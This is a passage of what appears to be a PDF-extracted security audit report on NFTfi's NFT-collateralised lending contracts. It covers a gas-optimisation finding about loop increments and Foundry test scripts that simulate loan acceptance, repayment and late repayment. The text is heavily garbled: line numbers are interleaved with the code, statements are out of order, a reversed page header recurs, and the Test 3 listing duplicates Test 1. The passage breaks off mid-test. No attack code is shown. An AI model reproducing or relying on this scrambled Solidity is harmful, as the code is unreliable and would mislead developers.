        "body": "In the setERC20Permits function, within the loop, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This also affects variables incremented inside the loop code block. Code Location: Listing 3: DirectLoanBaseMinimal.sol (Line 374) 371 function setERC20Permits ( address [] memory _erc20s , bool []  memory _permits ) external onlyOwner { 372 require ( _erc20s . length == _permits . length , \"  setERC20Permits function information arity mismatch \"); 373 374 375 376 377 for ( uint256 i = 0; i < _erc20s . length ; i ++) { _setERC20Permit ( _erc20s [i ], _permits [ i ]) ; } } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of a uint variable inside a loop for gas saving. 16 Remediation Plan: ACKNOWLEDGED: The NFTfi team acknowledged this issue. 17 MANUAL TESTING 18 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 SCENARIOS TESTED  Test 1: Lending - Borrow - normal repay procedure  Test 2: Lending - Borrow and repay Out Of Time (revert expected)  Test 3: Lending - Borrow - Out Of Time - normal liquidation procedure  Test 4: Lending - Borrow and liquidate ahead of schedule (revert expected)  Test 5: Lending - Borrow - Out of time - Renegotiate - normal repay procedure  Test 6: Attack: Borrower tries to renegotiate their own loan to steal the NFT (revert expected) Script The following test environment was set up for the purposes of executing the above scenarios: Listing 4: NFTFi.t.sol 1 // SPDX - License - Identifier : UNLICENSED 2 pragma solidity 0.8.4; 3 4 import \" forge - std / Test . sol \"; 5 import \" ../ src / contracts / NftfiHub . sol \"; 6 import \" ../ src / contracts / loans / direct / loanTypes /  DirectLoanFixedOfferRedeploy . sol \"; 7 import \" @openzeppelin / contracts / utils / cryptography / ECDSA . sol \"; 8 import \" ../ src / contracts / mocks / NFT . sol \" ; 9 import \" ../ src / contracts / mocks / NFTWrapper . sol \" ; 10 import \" ../ src / contracts / loans / direct / DirectLoanCoordinator . sol \"; 11 import \" ../ src / contracts / mocks / SimpleERC20 . sol \"; 12 import \" ../ src / contracts / permittedLists /  PermittedNFTsAndTypeRegistry . sol \"; 13 import \" ../ src / contracts / loans / direct / loanTypes / LoanData . sol \"; 14 15 contract NftfiTest is Test { 19 G N I T S E T L A U N A M NFT internal nftContract ; NFTWrapper internal nftWrapper ; SmartNft internal nftPromissoryNote ; SmartNft internal nftObligationReceipt ; SimpleToken internal token ; NftfiHub internal nftFiHub ; DirectLoanCoordinator internal directLoanCoordinator ; DirectLoanFixedOfferRedeploy internal using ECDSA for bytes32 ; PermittedNFTsAndTypeRegistry internal 16 17 18 19 20 21 22 23 24 25  directLoanFixedOfferRedeploy ; 26  permittedNFTsAndTypeRegistry ; 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 address internal owner ; address internal admin ; address internal alice ; address internal bobby ; address internal carla ; address internal edgar ; address internal zeroo ; uint256 internal verifyingSignerPrivateKey ; address internal verifyingSigner ; address internal dappIdentifier1 ; address internal sender ; address [] internal permittedErc20s ; string [] internal contractKeys ; address [] internal contractAddresses ; string [] internal definedNftTypes ; address [] internal definedNftWrappers ; address [] internal permittedNftContracts ; string [] internal permittedNftTypes ; uint256 internal timeNow = block . timestamp ; uint256 internal day = 86400; string [] internal loanTypes ; address [] internal loanContracts ; bool internal liquidated ; /* *************** */ /* ADDRESSES SETUP */ function setUp () public { G N I T S E T L A U N A M 20 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 /* *************** */ // ADDRESSES DECLARATION owner = vm . addr (0 xAA ); alice = vm . addr (0 xAB ); bobby = vm . addr (0 xAC ); carla = vm . addr (0 xAD ); edgar = vm . addr (0 xAE ); zeroo = address (0) ; admin = owner ; // 100 ETHER PER ADDRESS vm . deal ( owner , 100 ether ); vm . deal ( alice , 100 ether ); vm . deal ( bobby , 100 ether ); vm . deal ( carla , 100 ether ); vm . deal ( edgar , 100 ether ); // LABELING ADDRESSES vm . label ( owner , \" owner \" ); vm . label ( alice , \" alice \" ); vm . label ( bobby , \" bobby \" ); vm . label ( carla , \" carla \" ); vm . label ( edgar , \" edgar \" ); /* ***************** */ /* ENVIRONMENT SETUP */ /* ***************** */ // DEPLOYING NFTWRAPPER vm . prank ( admin ); nftWrapper = new NFTWrapper () ; // DEPLOYING NFT CONTRACT vm . prank ( admin ); nftContract = new NFT ( address ( nftWrapper )) ; // MINT 5 NFTS TO ALICE vm . prank ( alice ); nftContract . mintNFT (5) ; // DEPLOYING AND MINTING TOKEN vm . prank ( admin ); G N I T S E T L A U N A M 21 101 token = new SimpleToken ( \" token \" , \" TKN \" , 1000000  _000000000000000000 ); 102 103 104 105 106 107 108 109 110 111 112 113 vm . prank ( admin ); token . transfer ( alice , 50 _000000000000000000 ); vm . prank ( admin ); token . transfer ( bobby , 1000 _000000000000000000 ); vm . prank ( admin ); token . transfer ( carla , 250 _000000000000000000 ); // LOGS console . log ( \" ****** SETTING ENVIRONMENT ****** \"); console . log ( \" ****** STATE 1 ******* \"); console . log ( \" ****** BALANCES ****** \"); console . log ( \" Balance Of Admin ---> \" , token .  balanceOf ( admin )); 114 console . log ( \" Balance Of Alice ---> \" , token .  balanceOf ( alice )); 115 console . log ( \" Balance Of Bobby ---> \" , token .  balanceOf ( bobby )); 116 console . log ( \" Balance Of Carla ---> \" , token .  balanceOf ( carla )); 117 console . log ( \" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 118 119 120 121 122 123 124 125 126 127 console . log ( \" \" ); console . log ( \" \" ); // PUSHING KEYS AND ADDRESSES OF NFT AND TOKEN CONTRACTS contractKeys . push ( ' PERMITTED_NFTS '); contractAddresses . push ( address ( nftContract )) ; permittedErc20s . push ( address ( token )) ; // DEPLOYING NFT HUB nftFiHub = new NftfiHub ( admin , contractKeys ,  contractAddresses ); 128 129 130 address nftFiHubAddr = address ( nftFiHub ); // DEPLOYING PROMISORY NOTES AND OBLIGATION RECEPT  CONTRACTS 131 nftObligationReceipt = new SmartNft ( admin , address (  nftFiHub ) , address ( directLoanCoordinator ) , \" nftObligationReceipt \" ,  \" NOR \" , \" customURI \"); 132 nftPromissoryNote = new SmartNft ( admin , address ( nftFiHub ) ,  address ( directLoanCoordinator ) , \" nftPromissoryNote \" , \" NOR \" , \"  customURI \"); 22 G N I T S E T L A U N A M 133 134 vm . prank ( admin ); nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; vm . prank ( admin ); nftPromissoryNote . setLoanCoordinator ( address ( 135 136  directLoanCoordinator )) ; 137 138 139 // DEPLOYING DIRECT_LOAN_FIXED_OFFER_REDEPLOY directLoanFixedOfferRedeploy = new  DirectLoanFixedOfferRedeploy ( admin , nftFiHubAddr , permittedErc20s )  ; 140 address directLoanFixedOfferRedeployAddr = address (  directLoanFixedOfferRedeploy ); 141 142 143 144 145 // DEPLOYING DIRECT LOAN COORDINATOR loanTypes . push ( \" DIRECT_LOAN_FIXED_REDEPLOY \" ); loanContracts . push ( address ( directLoanFixedOfferRedeploy )); directLoanCoordinator = new DirectLoanCoordinator ( address (  nftFiHub ) , admin , loanTypes , loanContracts ); 146 147 148 // INITIALIZING DIRECT LOAN COORDINATOR directLoanCoordinator . initialize ( address ( nftPromissoryNote  ) , address ( nftObligationReceipt )) ; vm . prank ( admin ); nftObligationReceipt . setLoanCoordinator ( address ( 149 150  directLoanCoordinator )) ; vm . prank ( admin ); nftPromissoryNote . setLoanCoordinator ( address ( 151 152  directLoanCoordinator )) ; 153 154 155 156 157 158 // SETTING CONTRACTKEYS AND CONTRACTADDRRESSES contractKeys . push ( ' DIRECT_LOAN_COORDINATOR '); contractAddresses . push ( address ( directLoanCoordinator )) ; vm . prank ( admin ); nftFiHub . setContract ( ' DIRECT_LOAN_COORDINATOR ' , address (  directLoanCoordinator )) ; 159 160 161 162 163 164 165 // REGISTRATION OF PERMITTED NFTS AND TYPES definedNftTypes . push ( ' ERC721 '); definedNftWrappers . push ( address ( nftWrapper )) ; permittedNftContracts . push ( address ( nftContract )) ; permittedNftTypes . push ( ' ERC721 '); permittedNFTsAndTypeRegistry = new  PermittedNFTsAndTypeRegistry ( admin , nftFiHubAddr , definedNftTypes , 23 G N I T S E T L A U N A M  definedNftWrappers , permittedNftContracts , permittedNftTypes ); 166 167 168 169 // APPROVALS FOR PUT NFTS AS COLATERAL vm . prank ( alice ); nftContract . setApprovalForAll ( address (  directLoanFixedOfferRedeployAddr ) , true ); 170 } G N I T S E T L A U N A M 24 TEST 1: Script Listing 5: NFTFi.t.sol 174 function test_1 () public { 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 }) ; /* ****************************************** */ /* TEST 1: LENDING BORROWING NORMAL PROCEDURE */ /* ****************************************** */ console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 1 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 200 201 202 203 204 205 206 207 208 209 210 211 212 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 25 213 214 215 216 217 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 218 219 220 221 222 223 224  ; 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 241 242 243 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 244 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 245 246 // LOGS 26 G N I T S E T L A U N A M 247 248 249 250 251 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 252 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 253 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 254 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 255 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 256 257 258 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 259 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 260 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 261 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 262 263 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 264 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 265 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 266  ; 267 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 268 269 270 271 272 273 274 275 276 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 5 DAYS LATER console . log (\" 5 DAYS LATER ... \"); vm . warp (5 * day ); // ALICE PAY THE MONEY 27 G N I T S E T L A U N A M 277 278 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 279 280 281 282 283 284 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 285 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 286 287 288 289 290 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 291 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 292 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 293 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 294 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 } console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); 28 G N I T S E T L A U N A M Output G N I T S E T L A U N A M 29 /* ****************************************************** */ /* TEST 2: LENDING BORROWING NORMAL PROCEDURE OUT OF TIME */ /* ****************************************************** */ TEST 2: Script Listing 6: NFTFi.t.sol 312 function test_2 () public { 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 }) ; console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 2 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 338 339 340 341 342 343 344 345 346 347 348 349 350 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 30 351 352 353 354 355 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 356 357 358 359 360 361 362  ; 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 379 380 381 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 382 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 383 384 // LOGS 31 G N I T S E T L A U N A M 385 386 387 388 389 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 390 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 391 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 392 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 393 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 394 395 396 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 397 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 398 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 399 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 400 401 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 402 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 403 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 404  ; 405 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 406 407 408 409 410 411 412 413 414 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 15 DAYS LATER console . log (\" 15 DAYS LATER ... \" ); vm . warp (15 * day ); // ALICE PAY THE MONEY 32 G N I T S E T L A U N A M 415 416 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 417 418 419 420 421 422 423 424 vm . prank ( alice ); vm . expectRevert () ; directLoanFixedOfferRedeploy . payBackLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 425 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 426 427 428 429 430 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 431 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 432 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 433 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 434 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); 33 G N I T S E T L A U N A M 450 } G N I T S E T L A U N A M Output 34 TEST 3: Script Listing 7: NFTFi.t.sol 174 function test_1 () public { 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 }) ; /* ****************************************** */ /* TEST 1: LENDING BORROWING NORMAL PROCEDURE */ /* ****************************************** */ console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 1 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 200 201 202 203 204 205 206 207 208 209 210 211 212 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 35 213 214 215 216 217 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 218 219 220 221 222 223 224  ; 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , signaturefi ,  borrowerSettings ); 241 242 243 // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 loanPrincipalAmount , uint256 maximumRepaymentAmount ,  uint256 nftCollateralId , address loanERC20Denomination , uint32  loanDuration , uint32 loanInterestRateForDuration , uint16  loanAdminFeeInBasisPoints , address nftCollateralWrapper , uint64  loanStartTime , address nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 244 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 245 246 // LOGS 36 G N I T S E T L A U N A M 247 248 249 250 251 console . log (\" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log (\" \"); console . log (\" ****** STATE 1 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 252 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 253 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 254 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 255 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 256 257 258 console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount ---> \" ,  loanPrincipalAmount ); 259 console . log (\" maximumRepaymentAmount ---> \" ,  maximumRepaymentAmount ); 260 console . log (\" nftCollateralId ---> \" ,  nftCollateralId ); 261 console . log (\" loanERC20Denomination ---> \" ,  loanERC20Denomination ); 262 263 console . log (\" loanDuration console . log (\" interestRateForDuration ---> \" , loanDuration ); ---> \" ,  loanInterestRateForDuration ); 264 console . log (\" loanAdminFeeInBasisPoints ---> \" ,  loanAdminFeeInBasisPoints ); 265 console . log (\" nftCollateralWrapper ---> \" ,  nftCollateralWrapper ); 266  ; 267 console . log (\" loanStartTime ---> \" , loanStartTime ) console . log (\" nftCollateralContract ---> \" ,  nftCollateralContract ); 268 269 270 271 272 273 274 275 276 console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" , borrower ); ---> \" , liquidated ); // 5 DAYS LATER console . log (\" 5 DAYS LATER ... \"); vm . warp (5 * day ); // ALICE PAY THE MONEY 37 G N I T S E T L A U N A M 277 278 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 279 280 281 282 283 284 vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // CHECKING THAT THE STATE IS AS EXPECTED ( uint256 a , uint256 b , uint256 c , address d , uint32 e , uint32  f , uint16 g , address h , uint64 i , address j , address k ) =  directLoanFixedOfferRedeploy . loanIdToLoan (1) ; 285 liquidated = directLoanFixedOfferRedeploy .  loanRepaidOrLiquidated (1) ; 286 287 288 289 290 console . log (\" TX : ALICE ---> PAY BACK LOAN \" ); console . log (\" \"); console . log (\" ****** STATE 3 ******* \" ); console . log (\" ****** BALANCES ****** \" ); console . log (\" Balance Of Admin ---> \" , token . balanceOf (  admin )); 291 console . log (\" Balance Of Alice ---> \" , token . balanceOf (  alice )); 292 console . log (\" Balance Of Bobby ---> \" , token . balanceOf (  bobby )); 293 console . log (\" Balance Of Carla ---> \" , token . balanceOf (  carla )); 294 console . log (\" Owner of the NFT ---> \" , nftContract .  ownerOf (1) ); 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 } console . log (\" \"); console . log (\" ****** LOAN DATA ****** \"); console . log (\" loanPrincipalAmount console . log (\" maximumRepaymentAmount console . log (\" nftCollateralId console . log (\" loanERC20Denomination console . log (\" loanDuration console . log (\" interestRateForDuration console . log (\" loanAdminFeeInBasisPoints console . log (\" nftCollateralWrapper console . log (\" loanStartTime console . log (\" nftCollateralContract console . log (\" borrower console . log (\" LOAN LIQUIDATED / REPAYED console . log (\" \"); ---> \" ,a ); ---> \" ,b ); ---> \" ,c ); ---> \" ,d ); ---> \" ,e ); ---> \" ,f ); ---> \" ,g ); ---> \" ,h ); ---> \" ,i ); ---> \" ,j ); ---> \" ,k ); ---> \" , liquidated ); 38 G N I T S E T L A U N A M Output G N I T S E T L A U N A M 39 TEST 4: Script Listing 8: NFTFi.t.sol 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 function test_4 () public { /* ***************************************************** */ /* TEST 4: LENDING + LIQUIDATION BEFORE THAN LOAN FINISH */ /* ***************************************************** */ console . log (\" ****************************** \" ); console . log (\" ********** ********** \" ); console . log (\" ****************************** \" ); console . log (\" \"); TEST 4 // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 1, nftCollateralContract : address ( nftContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo }) ; // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 615 616 617 618 619 620 621 622 623 624 625 626 627 G N I T S E T L A U N A M // GETTING CHAIN ID uint256 id ; assembly { id := chainid () } // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : hex \" 1c \" 40 628 629 630 631 632 }) ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( abi . encodePacked ( getEncodedOffer ( offer ) ,  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 633 634 635 636 637 638 639  ; 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 ); // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( message ); // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s ) = vm . sign (0 xAC , signedMessage ) bytes memory v_bytes ; if (v == 27) { v_bytes = hex \"1 b \" ;} else { v_bytes = hex \" 1 c\" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature ({ nonce : 1, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf }) ; // ALICE ACCEPTS 